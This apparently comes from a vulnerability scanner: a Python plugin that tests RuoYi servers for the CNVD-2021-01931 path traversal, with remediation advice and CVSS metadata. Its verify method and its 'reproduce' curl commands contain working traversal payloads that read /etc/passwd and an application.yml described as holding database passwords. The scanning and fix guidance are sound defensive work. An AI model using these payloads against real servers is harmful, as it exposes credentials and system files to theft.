# 任意文件读取：若依 /common/download/resource 路径穿越读取服务器文件
# 漏洞原因：若依旧版 /common/download/resource?resource= 接口未对 resource 参数做白名单校验，
#   攻击者构造 ../ 路径穿越可读取任意文件（如 /etc/passwd、/proc/self/environ）。
# 本插件仅做存在性验证：读取 /etc/passwd，检测响应是否含真实 passwd 文件特征。
# D4 改造（2026-07-18）：删除签名 marker，改真实 /etc/passwd 特征判定，兼容签名靶场与真实若依。
from core.http import join_url
from core.models import STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN, ScanResult
from lib.colors import no, ok
from plugins.base import PluginBase


def _is_passwd_file(text):
    """判定响应是否为真实 /etc/passwd 文件内容

    真实 /etc/passwd 文件特征：
    - 每行格式：username:x:uid:gid:gecos:home:shell
    - 含 root 账户行：root:x:0:0:root:/root:/bin/bash（或 /bin/sh）
    - 含 daemon/bin/sys 等系统账户行
    - uid/gid 为数字

    Returns:
        (hit: bool, evidence: str)
    """
    if not text:
        return False, "空响应"

    # 提取所有形如 name:x:uid:gid:... 的行
    import re

    passwd_pattern = re.compile(r"^([a-zA-Z_][a-zA-Z0-9_-]*):x:(\d+):(\d+):", re.MULTILINE)
    matches = passwd_pattern.findall(text)
    if not matches:
        return False, "响应不含 passwd 格式行"

    # 至少匹配到 2 个账户行（真实 /etc/passwd 通常含 root + 多个系统账户）
    if len(matches) < 2:
        return False, f"仅匹配到 {len(matches)} 个 passwd 行（需 ≥2）"

    # 强特征：含 root 账户（uid=0）
    has_root = any(name == "root" and uid == "0" for name, uid, gid in matches)
    # 次强特征：含常见系统账户（daemon/bin/sys/nobody/mail 等）
    system_accounts = {"root", "daemon", "bin", "sys", "nobody", "mail", "ftp", "www-data"}
    has_system = any(name in system_accounts for name, uid, gid in matches)

    if has_root or has_system:
        # 提取前 3 个账户名作为证据
        names = [m[0] for m in matches[:3]]
        return True, f"读取到 /etc/passwd：{names}"
    return False, "passwd 行无 root/系统账户"


class RuoyiFileReadPathPlugin(PluginBase):
    name = "任意文件读取（路径穿越）"
    cve = "CNVD-2021-01931"
    severity = "high"
    category = "vuln"
    description = (
        "若依 /common/download/resource?resource= 接口未对 resource 参数做白名单校验，"
        "攻击者构造 ../ 路径穿越可读取任意文件"
    )
    fix = "resource 参数白名单校验（仅允许 /profile/upload/ 下的文件）；禁止 .. 路径穿越；升级到若依 4.7+ 已修复该漏洞"
    fix_detail = (
        "【升级方案】升级 RuoYi 至 4.7.0+（该版本已修复路径穿越）\n"
        "【代码修复】CommonController.downloadResource() 添加路径校验：\n"
        '  if (!resource.startsWith("/profile/upload/")) { throw new ServiceException("非法 resource 路径"); }\n'
        '  if (resource.contains("..")) { throw new ServiceException("禁止路径穿越"); }\n'
        "【权限加固】为 /common/download/resource 添加 @PreAuthorize(\"@ss.hasPermi('monitor:download')\")\n"
        '【WAF 规则】拦截 resource 参数含 ".." 或不以 "/profile/upload/" 开头的请求\n'
        "【合规】OWASP A01:2021 失效的访问控制；等保 2.0 8.1.4 访问控制"
    )
    reproduce = (
        "# 读取 /etc/passwd（Linux）：\n"
        'curl "http://target/common/download/resource?resource=/profile/../../../../../../../etc/passwd"\n'
        "\n"
        "# 读取 application.yml（若依配置文件，含数据库密码）：\n"
        'curl "http://target/common/download/resource?resource=/profile/../../../../../../../app/application.yml"\n'
        "\n"
        '# 预期响应：响应体含 "root:x:0:0:" 格式行（/etc/passwd 特征）或 "spring.datasource" 字样'
    )
    # D2：路径穿越在 4.7.0 已修复
    affected_versions = ">=4.0,<4.7"
    # D12：CVSS v3.1 + 合规映射
    cvss_vector = "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
    compliance = "等保2.0:8.1.4;OWASP:A01:2021"
    # D7: WAF 绕过支持
    vuln_type = "file_read"
    supports_waf_bypass = True

    def verify(self, target, session):
        # 路径穿越 payload：从若依默认资源目录向上穿越读 /etc/passwd
        url = join_url(target, "/common/download/resource?resource=../../../etc/passwd")
        try:
            resp = session.get(url)
        except Exception as e:
            print(no("任意文件读取（网络异常）"))
            return ScanResult(kind="vuln", name=self.name, status=STATUS_UNKNOWN, url=url, evidence=str(e))

        text = resp.text or ""
        code = getattr(resp, "status_code", 0)

        # 200 + 真实 /etc/passwd 特征 → CONFIRMED
        if code == 200:
            hit, evidence = _is_passwd_file(text)
            if hit:
                print(ok("存在任意文件读取漏洞（路径穿越）"))
                return ScanResult(
                    kind="vuln",
                    name=self.name,
                    severity=self.severity,
                    status=STATUS_CONFIRMED,
                    url=url,
                    evidence=evidence,
                    fix=self.fix,
                    extra={
                        "vuln_type": "arbitrary_file_read",
                        "payload_class": "traversal_etc_passwd",
                        "plugin_name": "file_read_path",
                    },
                )

        # 400/403/404 → 拦截或端点不存在；200 但无特征 → 安全
        if code in (400, 403):
            reason = f"HTTP {code} 路径被拦截"
        elif code == 404:
            reason = "HTTP 404 端点不存在"
        elif code == 200:
            _, reason = _is_passwd_file(text)
            reason = f"200 但{reason}"
        else:
            reason = f"HTTP {code} 非 200 响应"
        print(no(f"不存在任意文件读取漏洞（{reason}）"))
        return ScanResult(kind="vuln", name=self.name, status=STATUS_SAFE, url=url, evidence=reason)
